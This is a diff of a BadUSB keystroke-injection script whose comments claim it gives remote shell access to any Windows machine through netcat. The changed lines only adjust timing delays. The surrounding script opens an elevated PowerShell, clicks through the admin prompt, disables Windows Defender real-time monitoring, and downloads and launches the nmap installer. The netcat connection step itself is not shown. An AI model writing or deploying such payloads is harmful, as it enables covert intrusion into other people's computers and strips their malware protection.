@@ -2,21 +2,22 @@ REM shell access to any windows machine badusb, use netcat to get remote access 
 REM then run the bad usb payload onto the targets windows machine 
 REM made by BisKit
 WINDOWS r
+DELAY 200
 STRING powershell
 ENTER
-DELAY 84
+DELAY 600
 STRING Start-Process powershell -Verb RunAs
 ENTER
-DELAY 215
+DELAY 710
 LEFTARROW
 ENTER
-DELAY 225
+DELAY 660
 STRING Set-MpPreference -DisableRealtimeMonitoring $true
 ENTER
-DELAY 200
+DELAY 729
 ALT F4
 ALT F4
-DELAY 499
+DELAY 345
 WINDOWS r
 DELAY 215
 STRING https://nmap.org/dist/nmap-7.95-setup.exe
@@ -34,9 +35,9 @@ ENTER
 DELAY 1455
 STRING start nmap-7.95-setup.exe
 ENTER
-DELAY 325
+DELAY 710
 LEFTARROW
-DELAY 733
+DELAY 823
 ENTER
 DELAY 525
 ENTER
@@ -54,7 +55,7 @@ DELAY 400
 ENTER
 DELAY 200
 WINDOWS r
-DELAY 94
+DELAY 290
 STRING powershell
 ENTER
 DELAY 895
